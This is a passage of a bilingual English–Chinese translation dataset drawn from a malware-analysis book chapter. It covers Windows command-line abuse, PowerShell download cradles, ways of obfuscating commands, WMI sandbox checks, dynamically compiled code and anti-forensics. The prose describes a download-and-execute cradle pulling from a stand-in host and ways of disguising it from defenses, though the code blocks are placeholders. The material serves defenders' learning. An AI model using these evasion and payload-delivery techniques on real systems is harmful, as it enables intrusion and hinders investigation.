  zh: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">ping</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c ping 8.8.8.8</samp> | <samp class="SANS_Futura_Std_Book_11">向远程服务器发送 Ping 请求。恶意软件可能会利用它来检查受害者是否连接到互联网（例如作为沙箱检测技术），或者与其
    C2 服务器进行初步联系。</samp> |'
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">sc</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c sc query</samp> | <samp class="SANS_Futura_Std_Book_11">Starts, stops, creates,
    modifies, or queries services on the system when coupled with the respective option
    (such as</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">query</samp><samp
    class="SANS_Futura_Std_Book_11">, shown here).</samp> |'
  id: totrans-121
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">sc</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c sc query</samp> | <samp class="SANS_Futura_Std_Book_11">启动、停止、创建、修改或查询系统中的服务，具体取决于相应的选项（例如此处显示的</samp>
    <samp class="SANS_TheSansMonoCd_W5Regular_11">query</samp><samp class="SANS_Futura_Std_Book_11">）。</samp>
    |'
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">taskkill.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c taskkill.exe /f</samp> <samp
    class="SANS_TheSansMonoCd_W5Regular_11">/</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">IM</samp>
    <samp class="SANS_TheSansMonoCd_W5Regular_11">evil.exe</samp> | <samp class="SANS_Futura_Std_Book_11">Terminates
    processes. Malware may invoke it to kill either its own processes or analysis
    tools and endpoint defenses.</samp> |'
  id: totrans-122
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">taskkill.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c taskkill.exe /f</samp> <samp
    class="SANS_TheSansMonoCd_W5Regular_11">/</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">IM</samp>
    <samp class="SANS_TheSansMonoCd_W5Regular_11">evil.exe</samp> | <samp class="SANS_Futura_Std_Book_11">终止进程。恶意软件可能会调用此命令来杀死其自身的进程或分析工具和终端防御。</samp>
    |'
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">timeout.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c timeout /t 120 nobreak>nul</samp>
    | <samp class="SANS_Futura_Std_Book_11">Pauses execution in batch scripts. Malware
    may execute it to attempt to time out “dumb” malware analysis sandboxes.</samp>
    |'
  id: totrans-123
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">timeout.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c timeout /t 120 nobreak>nul</samp>
    | <samp class="SANS_Futura_Std_Book_11">在批处理脚本中暂停执行。恶意软件可能会执行它，尝试使“愚笨”的恶意软件分析沙箱超时。</samp>
    |'
- en: While this section only scratches the surface of the Windows command line, these
    are some of the ways malware can abuse the operating system’s various utilities
    and commands in Windows. Since *cmd.exe* is a legitimate Windows binary, some
    of these actions may go unnoticed by endpoint defenses and analysts, so it’s important
    to be aware of these techniques.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然这一部分只是简单地介绍了 Windows 命令行的表面，但这些是恶意软件滥用 Windows 操作系统各种实用工具和命令的几种方式。由于 *cmd.exe*
    是合法的 Windows 二进制文件，其中一些操作可能会被终端防御系统和分析人员忽视，因此了解这些技术非常重要。
- en: '#### <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">PowerShell</samp>'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: '#### <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">PowerShell</samp>'
- en: Leveraging PowerShell is one of the most prevalent living off the land techniques
    in use by modern threats. *PowerShell* is a framework built into Windows that
    can be used, by legitimate system users and malware alike, to perform nearly any
    administration or configuration task in Windows. PowerShell exposes many commands,
    called *cmdlets*, that give the framework its power (pun intended). PowerShell
    is built on the .NET platform, which provides Windows developers with many libraries
    for building new applications. PowerShell can be run interactively via its command
    line, but in the context of malware, it’s often executed as an automated script
    or one-line command via the Windows API (using <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcess</samp>,
    for example).
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 利用 PowerShell 是现代威胁中最常见的“借用土地”技术之一。*PowerShell* 是内建于 Windows 中的框架，合法的系统用户和恶意软件都可以使用它来执行几乎任何
    Windows 管理或配置任务。PowerShell 提供了许多命令，称为 *cmdlets*，这些命令赋予了该框架强大的功能（玩笑的意思）。PowerShell
    构建于 .NET 平台之上，为 Windows 开发人员提供了许多库来构建新应用程序。PowerShell 可以通过命令行交互式运行，但在恶意软件的上下文中，它通常通过
    Windows API 执行自动化脚本或单行命令（例如使用 <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcess</samp>）。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Implementing Cradles</samp>
  id: totrans-127
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">实现支架</samp>
- en: 'One of the most common applications of PowerShell in malware is a *cradle*,
    a command (usually a single line) that downloads additional malware or modules
    from a staging server, sometimes directly executing these files as well. Here’s
    one way in which malware might implement a cradle:'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 在恶意软件中的一个最常见应用是 *启动器*，它是一个命令（通常是单行命令），用于从暂存服务器下载附加的恶意软件或模块，有时还会直接执行这些文件。以下是恶意软件可能实现启动器的一种方式：
- en: '[PRE13]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'Let’s break down this PowerShell command. First, it takes advantage of the
    <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-WebRequest</samp> cmdlet,
    which sends an HTTP or HTTPS request to a remote web server. This cmdlet accepts
    as input the web server address and directory path of the file that will be downloaded
    (*zzl2.cab*). Finally, the <samp class="SANS_TheSansMonoCd_W5Regular_11">-OutFile</samp>
    flag denotes the directory path and filename with which to save the file. This
    malicious *zzl2.cab* file will be saved in the user’s profile directory (indicated
    by the environment variable <samp class="SANS_TheSansMonoCd_W5Regular_11">$ENV:UserProfile</samp>)
    as *crypt.dll*. Since PowerShell is built on .NET, it has direct access to and
    can take advantage of the many .NET methods and classes:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来分析这个 PowerShell 命令。首先，它利用了 <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-WebRequest</samp>
    cmdlet，它向远程 Web 服务器发送 HTTP 或 HTTPS 请求。这个 cmdlet 接受作为输入的 Web 服务器地址和将要下载的文件的目录路径（*zzl2.cab*）。最后，<samp
    class="SANS_TheSansMonoCd_W5Regular_11">-OutFile</samp> 标志表示保存文件的目录路径和文件名。这个恶意的
    *zzl2.cab* 文件将被保存在用户的个人资料目录中（由环境变量 <samp class="SANS_TheSansMonoCd_W5Regular_11">$ENV:UserProfile</samp>
    指示），文件名为 *crypt.dll*。由于 PowerShell 基于 .NET，它可以直接访问并利用许多 .NET 方法和类：
- en: '[PRE14]'
  id: totrans-131
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: In this command, the <samp class="SANS_TheSansMonoCd_W5Regular_11">-exec</samp>
    flag tells PowerShell to bypass any execution policies in place that would prevent
    the command from executing. PowerShell execution policies are configured on Windows
    to prevent certain PowerShell actions but can sometimes be bypassed quite easily.
    <samp class="SANS_TheSansMonoCd_W5Regular_11">IEX</samp> is short for <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-Expression</samp>,
    which will execute the string that precedes it as a command. The next part of
    the command, the <samp class="SANS_TheSansMonoCd_W5Regular_11">(New-Object Net.WebClient).DownloadString</samp>
    expression, creates a new .NET <samp class="SANS_TheSansMonoCd_W5Regular_11">WebClient</samp>
    object with the <samp class="SANS_TheSansMonoCd_W5Regular_11">DownloadString</samp>
    method, which is another way malware can send web requests to a remote web server
    and download a payload. This payload will be downloaded from *http://<wbr>www<wbr>.evil<wbr>.cn*
    and executed directly in memory. If you’re interested in learning more about PowerShell
    cradles, see [*https://<wbr>gist<wbr>.github<wbr>.com<wbr>/mgeeky<wbr>/3b11169ab77a7de354f4111aa2f0df38*](https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38)
    and [*https://<wbr>gist<wbr>.github<wbr>.com<wbr>/HarmJ0y<wbr>/bb48307ffa663256e239*](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个命令中，<samp class="SANS_TheSansMonoCd_W5Regular_11">-exec</samp> 标志告诉 PowerShell
    绕过任何会阻止命令执行的执行策略。PowerShell 执行策略在 Windows 中配置，以防止某些 PowerShell 操作，但有时可以相当容易地绕过。<samp
    class="SANS_TheSansMonoCd_W5Regular_11">IEX</samp> 是 <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-Expression</samp>
    的缩写，它将执行前面的字符串作为命令。命令的下一部分，<samp class="SANS_TheSansMonoCd_W5Regular_11">(New-Object
    Net.WebClient).DownloadString</samp> 表达式，创建了一个新的 .NET <samp class="SANS_TheSansMonoCd_W5Regular_11">WebClient</samp>
    对象，并使用 <samp class="SANS_TheSansMonoCd_W5Regular_11">DownloadString</samp> 方法，这是恶意软件向远程
    Web 服务器发送 Web 请求并下载有效负载的另一种方式。该有效负载将从 *http://<wbr>www<wbr>.evil<wbr>.cn* 下载，并直接在内存中执行。如果你有兴趣了解更多关于
    PowerShell 启动器的信息，请查看 [*https://<wbr>gist<wbr>.github<wbr>.com<wbr>/mgeeky<wbr>/3b11169ab77a7de354f4111aa2f0df38*](https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38)
    和 [*https://<wbr>gist<wbr>.github<wbr>.com<wbr>/HarmJ0y<wbr>/bb48307ffa663256e239*](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)。
- en: The problem with these PowerShell cradles is that they’re immediately identifiable
    as suspicious, so let’s look at how PowerShell commands can be obfuscated to circumvent
    endpoint defenses and inhibit investigation.
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 这些 PowerShell 启动器的问题在于它们很容易被识别为可疑的，因此我们来看看 PowerShell 命令如何被混淆，以绕过端点防御并阻碍调查。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Obfuscating PowerShell</samp>
  id: totrans-134
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">混淆 PowerShell</samp>
- en: 'PowerShell is extremely syntax tolerant, meaning that threat actors have a
    lot of room to obscure commands, rearrange characters in the command, or even
    insert unnecessary characters to confuse analysts and detection tools. As you’ll
    see, there are a few common ways in which malware authors obfuscate PowerShell
    execution. Let’s use this command as a starting point:'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 对语法的容忍度非常高，这意味着威胁行为者有很多空间来混淆命令、重新排列命令中的字符，甚至插入不必要的字符来混淆分析人员和检测工具。正如你将看到的，恶意软件作者有一些常见的方式来混淆
    PowerShell 执行。让我们以这个命令作为起点：
- en: '[PRE15]'
  id: totrans-136
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'One simple obfuscation method is to insert <samp class="SANS_TheSansMonoCd_W5Regular_11">+</samp>
    characters into the command, as follows:'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 一种简单的混淆方法是将 <samp class="SANS_TheSansMonoCd_W5Regular_11">+</samp> 字符插入到命令中，如下所示：
- en: '[PRE16]'
  id: totrans-138
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'Characters can be either upper- or lowercase, so the following is still a valid
    PowerShell command:'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 字符可以是大写或小写，因此以下命令仍然是有效的 PowerShell 命令：
- en: '[PRE17]'
  id: totrans-140
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: However, it’s a bit more difficult to read.
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，这样的话就有点难以阅读了。
- en: 'Characters can also be reordered, as in this example:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 字符也可以重新排序，如下所示：
- en: '[PRE18]'
  id: totrans-143
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: The numbers in brackets represent the positions of the <samp class="SANS_TheSansMonoCd_W5Regular_11">X</samp>,
    <samp class="SANS_TheSansMonoCd_W5Regular_11">E</samp>, and <samp class="SANS_TheSansMonoCd_W5Regular_11">I</samp>
    characters after the reordering occurs, so these characters essentially make up
    <samp class="SANS_TheSansMonoCd_W5Regular_11">IEX</samp>.
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 括号中的数字表示字符 <samp class="SANS_TheSansMonoCd_W5Regular_11">X</samp>、<samp class="SANS_TheSansMonoCd_W5Regular_11">E</samp>
    和 <samp class="SANS_TheSansMonoCd_W5Regular_11">I</samp> 在重新排序后的位置，因此这些字符本质上构成了
    <samp class="SANS_TheSansMonoCd_W5Regular_11">IEX</samp>。
- en: 'Finally, PowerShell allows Base64-encoded data, so it’s entirely possible to
    issue an encoded command such as this:'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，PowerShell 允许 Base64 编码的数据，因此完全有可能发出像这样的编码命令：
- en: '[PRE19]'
  id: totrans-146
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: We’ll discuss Base64 encoding in [Chapter 16](chapter16.xhtml). For now, we’ll
    turn to one final PowerShell-related functionality that malware can leverage to
    its advantage.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在[第16章](chapter16.xhtml)中讨论 Base64 编码。目前，我们将转向恶意软件可以利用的与 PowerShell 相关的最后一个功能。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Querying WMI</samp>
  id: totrans-148
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">查询 WMI</samp>
- en: 'As you might recall from previous chapters, *Windows Management Instrumentation
    (WMI)* allows system administrators to manage data and automate operations in
    Windows. In Windows 7 and earlier versions, the *Windows* *Management Instrumentation
    Console (WMIC)* was used to invoke WMI, but this is now deprecated on modern versions.
    It’s much more common now to invoke WMI using PowerShell, which has several built-in
    component cmdlets to interact with WMI. One example is <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-CimInstance</samp>,
    a cmdlet that malware can also use to query WMI objects. To gather information
    on the system, such as whether it’s a virtual machine or a sandbox, malware could
    execute the following commands directly from PowerShell:'
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你从前几章中可能记得的那样，*Windows 管理工具 (WMI)* 允许系统管理员在 Windows 中管理数据和自动化操作。在 Windows
    7 及更早版本中，*Windows 管理工具控制台 (WMIC)* 被用来调用 WMI，但在现代版本中，这已经被弃用。现在更常见的做法是使用 PowerShell
    来调用 WMI，它具有几个内置的组件 cmdlet 用于与 WMI 交互。一个例子是 <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-CimInstance</samp>，这是一个恶意软件也可以用来查询
    WMI 对象的 cmdlet。为了收集系统信息，例如它是否是虚拟机或沙盒，恶意软件可以直接从 PowerShell 执行以下命令：
- en: '[PRE20]'
  id: totrans-150
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: 'These commands query WMI for the system’s processor, BIOS, and disk drive information.
    In the following output, you can see from my BIOS information that I am running
    VirtualBox:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 这些命令查询 WMI 以获取系统的处理器、BIOS 和硬盘驱动器信息。在以下输出中，你可以从我的 BIOS 信息看到我正在运行 VirtualBox：
- en: '[PRE21]'
  id: totrans-152
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'Other interesting objects to query are <samp class="SANS_TheSansMonoCd_W5Regular_11">ThermalZoneTemperature</samp>
    and <samp class="SANS_TheSansMonoCd_W5Regular_11">Win32_Fan</samp>, which will
    return the current CPU temperature and the fan speed, respectively:'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 其他有趣的查询对象是 <samp class="SANS_TheSansMonoCd_W5Regular_11">ThermalZoneTemperature</samp>
    和 <samp class="SANS_TheSansMonoCd_W5Regular_11">Win32_Fan</samp>，它们分别返回当前 CPU
    温度和风扇转速：
- en: '[PRE22]'
  id: totrans-154
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: If these functions return an error or do not return any information, it could
    mean that they haven’t been implemented, meaning that the host is possibly a virtual
    machine.
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 如果这些功能返回错误或没有返回任何信息，这可能意味着它们未被实现，表示主机可能是虚拟机。
- en: 'WMI is an extensive topic, and there are other ways malware may invoke it (such
    as directly using WMI interfaces like <samp class="SANS_TheSansMonoCd_W5Regular_11">IwbemServices.ExecQuery</samp>),
    but these are beyond the scope of this book and won’t be discussed further. Instead,
    we’ll move on to one more living off the land and fileless technique: the use
    of dynamically compiled code.'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: WMI是一个广泛的主题，恶意软件可能通过其他方式调用它（例如直接使用WMI接口，如 <samp class="SANS_TheSansMonoCd_W5Regular_11">IwbemServices.ExecQuery</samp>），但这些超出本书的范围，不再详述。相反，我们将继续讨论另一种生存之道和无文件技术：动态编译代码。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Dynamically Compiled
    Code</samp>
  id: totrans-157
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">动态编译的代码</samp>
- en: '*Dynamically compiled malicious code* is seeing increased usage in malware.
    Upon delivery to the victim, this code is compiled and executed from memory, which
    may help the attack fly under the radar of endpoint defenses. This technique is
    often accompanied by the use of a dropper component. The dropper may be delivered
    to the victim (embedded inside an email, for example), and once it executes on
    the victim system, it downloads the malicious code from a server on the internet.
    This malicious code is often encrypted or obfuscated. Once the payload successfully
    downloads onto the victim host, it is decrypted and then compiled in memory by
    an existing compiler on the victim system. Modern versions of Windows include
    several compilers by default; these include the .NET compilers *msbuild.exe* and
    *csc.exe*. [Figure 15-5](chapter15.xhtml#fig15-5) shows how this technique might
    look in action.'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: '*动态编译的恶意代码* 在恶意软件中的使用正在增加。传送到受害者后，该代码会在内存中编译并执行，这可能有助于攻击规避端点防御的监测。这种技术通常伴随着使用一个分发器组件。分发器可能会传送给受害者（例如，嵌入在电子邮件中），一旦在受害者系统上执行，它就会从互联网上的服务器下载恶意代码。这种恶意代码通常是加密或混淆的。一旦有效载荷成功下载到受害主机，它就会被现有编译器在受害系统上的内存中解密并编译。现代版本的Windows默认包括几个编译器，其中包括.NET编译器
    *msbuild.exe* 和 *csc.exe*。[图15-5](chapter15.xhtml#fig15-5)展示了这种技术在实际中的样子。'
- en: '![](../images/fig15-5.jpg)'
  id: totrans-159
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-5.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-5: An attack involving
    dynamically compiled code</samp>'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图15-5：涉及动态编译代码的攻击</samp>
- en: This attack starts with a PowerShell cradle that downloads uncompiled .NET code
    from a remote server, perhaps using one of the methods described earlier in this
    chapter. Then, the PowerShell script invokes *csc.exe* to compile and execute
    the .NET code in memory.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 此攻击始于一个PowerShell cradle，从远程服务器下载未编译的.NET代码，可能使用本章前述的方法之一。然后，PowerShell脚本调用
    *csc.exe* 在内存中编译和执行.NET代码。
- en: Another compiler is *msbuild.exe*. Microsoft Build Engine (*Msbuild*) is “a
    platform for building Windows applications” that accepts projects (*.proj*) or
    XML-based project files as input, compiles them, and executes them upon building.
    I won’t go into more detail on this technique, but you can read more about it
    in Tara Gould and Gage Mele’s article “Threat Actors Use MSBuild to Deliver RATs
    Filessly” at [*https://<wbr>www<wbr>.anomali<wbr>.com<wbr>/blog<wbr>/threat<wbr>-actors<wbr>-use<wbr>-msbuild<wbr>-to<wbr>-deliver<wbr>-rats<wbr>-filelessly*](https://www.anomali.com/blog/threat-actors-use-msbuild-to-deliver-rats-filelessly).
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个编译器是 *msbuild.exe*。微软构建引擎（*Msbuild*）是一个“用于构建Windows应用程序的平台”，接受项目（*.proj*）或基于XML的项目文件作为输入，编译它们，并在构建时执行。我不会详细讨论这种技术，但你可以在Tara
    Gould和Gage Mele的文章“威胁行为者使用MSBuild无文件交付RATs”中阅读更多内容，网址为[*https://<wbr>www<wbr>.anomali<wbr>.com<wbr>/blog<wbr>/threat<wbr>-actors<wbr>-use<wbr>-msbuild<wbr>-to<wbr>-deliver<wbr>-rats<wbr>-filelessly*](https://www.anomali.com/blog/threat-actors-use-msbuild-to-deliver-rats-filelessly)。
- en: These techniques are especially interesting because they take advantage of multiple
    methods of defense evasion. First, these types of attacks can be almost completely
    fileless, as the downloaded code is compiled and executed only in memory. Second,
    they use LOLBins and compilers already available on the victim host, possibly
    allowing the attack to bypass controls such as AppLocker. Finally, when the malicious
    code downloads from the attacker’s server, it does so in an uncompiled state,
    so network defenses may not identify the code as malicious since they’re often
    tuned to look for compiled binaries. These are more examples of the many creative
    ways in which malware authors bypass and circumvent defenses.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 这些技巧特别有趣，因为它们利用了多种防御规避方法。首先，这些攻击几乎可以完全无文件，因为下载的代码只在内存中编译和执行。其次，它们使用受害主机上已经存在的LOLBin和编译器，可能绕过了如AppLocker等防控措施。最后，当恶意代码从攻击者的服务器下载时，它是以未编译的状态进行下载的，因此网络防御可能无法将其识别为恶意代码，因为网络防御通常会寻找已编译的二进制文件。这些是恶意软件作者绕过和规避防御的众多创意方式中的更多例子。
- en: Note that there are other methods of dynamic code compilation in Windows, such
    as using CGG/MinGW C compilers or *aspnet_compiler.exe* for compiling ASP.NET
    code. These compilers may be invoked from PowerShell, Command Prompt, or even
    Office documents with the help of VBA macro code.
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，Windows中还有其他动态代码编译方法，例如使用CGG/MinGW C编译器或*aspnet_compiler.exe*编译ASP.NET代码。这些编译器可以通过PowerShell、命令提示符，甚至通过VBA宏代码在Office文档中调用。
- en: In the final section of this chapter, we’ll explore a category of evasion techniques,
    called anti-forensics, that often go hand in hand with fileless attacks.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章的最后部分，我们将探讨一类规避技术，称为反取证，这类技术通常与无文件攻击一起出现。
- en: <samp class="SANS_Futura_Std_Bold_B_11">Anti-forensics</samp>
  id: totrans-166
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_B_11">反取证</samp>
- en: Imagine you’re an investigator recently assigned to a complex case of data theft.
    The victim organization determined that the incident occurred on a Windows server
    and was able to contain the attack by quarantining the server from the rest of
    the network, but not before the attacker made off with an unknown amount of potentially
    sensitive data. The strangest thing is that there are seemingly no breadcrumbs
    on the compromised server. No footprints to follow. No fingerprints or smudges
    left on the scene. All physical traces of malware have been removed from the hard
    disk. The system has been rebooted and there are no artifacts in memory to investigate.
    Some files on the disk even seem to have been encrypted, yet there is no demand
    for a ransom.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 想象一下，你是最近被指派到一起复杂的数据盗窃案件的调查员。受害组织确定事件发生在一台Windows服务器上，并通过将该服务器与其他网络隔离来遏制了攻击，但攻击者在此之前已经窃取了不明数量的潜在敏感数据。最奇怪的是，似乎在被入侵的服务器上没有留下任何蛛丝马迹。没有足迹可循。现场没有留下指纹或污迹。所有恶意软件的物理痕迹都已从硬盘中删除。系统已重新启动，内存中也没有可以调查的痕迹。硬盘上的某些文件甚至似乎已被加密，但没有提出赎金要求。
- en: What you may be witnessing is anti-forensics in action. Let’s take a look at
    some creative anti-forensics techniques used by malware authors.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能正在见证反取证的实际应用。让我们来看看一些恶意软件作者使用的创意反取证技巧。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Hiding Artifacts and
    Code</samp>
  id: totrans-169
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">隐藏痕迹和代码</samp>
- en: Cyberattacks always leave some trace evidence on compromised systems or networks,
    no matter how skilled and creative the attacker is. Knowing this, evasive malware
    may go to great lengths to cover its tracks and remove as much forensic evidence
    as possible. This often involves hiding or removing artifacts that may give away
    the attack from infected systems.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 网络攻击无论攻击者多么技艺高超或富有创意，总会在被入侵的系统或网络上留下某些痕迹证据。知道这一点后，恶意软件可能会竭尽全力掩盖其踪迹，尽可能地移除所有取证证据。这通常涉及隐藏或删除可能揭露攻击的痕迹，防止从被感染的系统上获取信息。
- en: One crude way in which malware can obscure evidence is by hiding important files
    and directories, such as its executable or configuration files. To do so, first
    the malware calls a function such as <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileAttributes</samp>
    on the relevant files, and then it applies the <samp class="SANS_TheSansMonoCd_W5Regular_11">hidden</samp>
    attribute to them using the native Windows feature. This will effectively make
    the files invisible to some system users, but more experienced users and investigators
    will be able to easily circumvent this method.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可以通过隐藏重要文件和目录（例如其可执行文件或配置文件）来模糊证据的一种粗略方式。为此，恶意软件首先会调用像 <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileAttributes</samp>
    这样的函数来处理相关文件，然后使用 Windows 原生功能将 <samp class="SANS_TheSansMonoCd_W5Regular_11">hidden</samp>
    属性应用于这些文件。这将使文件对一些系统用户不可见，但更有经验的用户和调查员将能够轻松绕过这种方法。
- en: '##### <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Removing and Corrupting
    Artifacts</samp>'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: '##### <samp class="SANS_Futura_Std_Bold_Condensed_B_11">移除和破坏痕迹</samp>'
- en: 'Rather than simply hiding files, some malware attempts to delete or destroy
    evidence altogether. It can delete its own files in many ways, such as by calling
    the <samp class="SANS_TheSansMonoCd_W5Regular_11">DeleteFile</samp> WinAPI function
    or invoking PowerShell or the Windows command line. Depending on the method of
    deletion, however, a skilled investigator might still be able to recover the deleted
    artifacts. To address this gap, some malware has incorporated utilities specializing
    in secure, unrecoverable data destruction. Unit42 researchers reported that the
    threat actors behind the BlackCat ransomware used fileshredder, a tool designed
    for unrecoverable destruction of files, to securely delete evidence from the victim
    system (see “Threat Assessment: BlackCat Ransomware,” by Amanda Tanner, Alex Hinchliffe,
    and Doel Santos, at [*https://<wbr>unit42<wbr>.paloaltonetworks<wbr>.com<wbr>/blackcat<wbr>-ransomware<wbr>/*](https://unit42.paloaltonetworks.com/blackcat-ransomware/)).'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 与单纯隐藏文件不同，一些恶意软件试图完全删除或销毁证据。它可以通过多种方式删除自己的文件，例如调用 <samp class="SANS_TheSansMonoCd_W5Regular_11">DeleteFile</samp>
    WinAPI 函数，或使用 PowerShell 或 Windows 命令行。 然而，根据删除的方法，经验丰富的调查员仍然可能能够恢复被删除的痕迹。为了解决这一问题，一些恶意软件已经集成了专门用于安全且不可恢复的数据销毁的工具。Unit42
    的研究人员报告称，BlackCat 勒索软件背后的威胁行为者使用了 fileshredder 工具，这是一种专为不可恢复删除文件而设计的工具，用于安全地删除受害系统中的证据（请参阅
    Amanda Tanner、Alex Hinchliffe 和 Doel Santos 撰写的《威胁评估：BlackCat 勒索软件》，链接见 [*https://<wbr>unit42<wbr>.paloaltonetworks<wbr>.com<wbr>/blackcat<wbr>-ransomware<wbr>/*](https://unit42.paloaltonetworks.com/blackcat-ransomware/)）。
- en: Additionally, since memory is one of the first places a skilled investigator
    hunts for malware, it’s wise for malware authors to clear their malware’s allotted
    memory. There are many ways of accomplishing this, such as by invoking the <samp
    class="SANS_TheSansMonoCd_W5Regular_11">RtlZeroMemory</samp> function, which overwrites
    a memory region with zeros, effectively destroying any evidence that was there.
    Some ransomware malware families have even been known to call <samp class="SANS_TheSansMonoCd_W5Regular_11">RtlZeroMemory</samp>
    and similar functions to zero out their encryption keys in memory to decrease
    the chances of key recovery.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，由于内存是经验丰富的调查员寻找恶意软件的首选地方之一，因此恶意软件作者通常会清除其分配的内存。实现这一点的方法有很多种，例如调用 <samp class="SANS_TheSansMonoCd_W5Regular_11">RtlZeroMemory</samp>
    函数，该函数会将内存区域用零覆盖，从而有效地销毁该区域内的任何证据。一些勒索软件家族甚至会调用 <samp class="SANS_TheSansMonoCd_W5Regular_11">RtlZeroMemory</samp>
